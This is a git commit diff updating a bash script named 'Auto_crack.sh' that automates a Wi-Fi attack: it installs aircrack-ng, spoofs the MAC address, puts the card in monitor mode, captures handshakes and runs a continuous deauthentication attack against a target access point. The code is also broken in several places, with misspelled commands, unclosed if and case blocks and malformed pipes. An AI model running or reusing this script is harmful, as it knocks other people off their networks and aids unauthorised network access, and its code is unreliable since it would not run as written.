c91182f96fac9c7a0aa668469a823a6d9f413d0b
Oni-kuki <88449481+Oni-kuki@users.noreply.github.com>
2022-10-26 07:54:49 +0200

    Update Auto_crack.sh

--- Auto_crack.sh
+++ Auto_crack.sh
@@ -8,11 +8,11 @@ install (){
     if [[ "$ID_LIKE" == "debian" ]]
     then
         apt update && apt upgrade -y
-        apt install macchanger net-tools aircrack-ng
+        apt install macchanger net-tools aircrack-ng -y
     elif [[ "$ID_LIKE" == "arch" ]]
     then
         pacman -Syu
-        pacman -S macchanger net-tools aircrack-ng
+        pacman -S macchanger net-tools aircrack-ng -y
     else
         echo "what kind of f*uck*ng OS do you have ?"
     fi
@@ -25,22 +25,34 @@ Choose_antenna () {
         case $fav in
             "Usb-B")
                 echo "So you have the $fav Alfa"
-                apt install 
+                echo "you don't have necessary to install drivers, normally every linux have the packets"
                 ;;
             "USB-C")
-                echo "So you have the $fav Alfa"
-                apt install realtek-rtl88xxau-dkms -y
+                if [[ "$ID_LIKE" == "debian" ]]
+                then
+                    echo "So you have the $fav Alfa"
+                    apt install realtek-rtl88xxau-dkms -y
+                else
+                    echo "So you have the $fav Alfa"
+                    pacman -S realtek-rtl88xxau-dkms -y
                 ;;
 }
 
 capture () {
-    ip a | grep "3: "
-    ifconfig wlan0 down
-    maccahanger wlan0 -r
-    iwconfig wlan0 mode monitor
-    airmong-ng 
-    airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx wlan0mon
-    aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon
-}
+    iwconfig > netcard.txt
+        if [[ -s netcard.txt ]]
+        then
+            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
+            ifconfig $(cat netcard.txt) down
+            macchanger $(cat netcard.txt) -r
+            iwconfig $(cat netcard.txt) mode monitor
+            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
+            airmong-ng start $(cat netcard.txt)
+            airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx $(cat netcard.txt)
+            aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx $(cat netcard.txt)
+
+        else 
+            echo "Are you sure about the connection of your alfa card, so check the connexion or the drivers or the name of your wlan network"
+    }
 
 Choose_antenna install capture
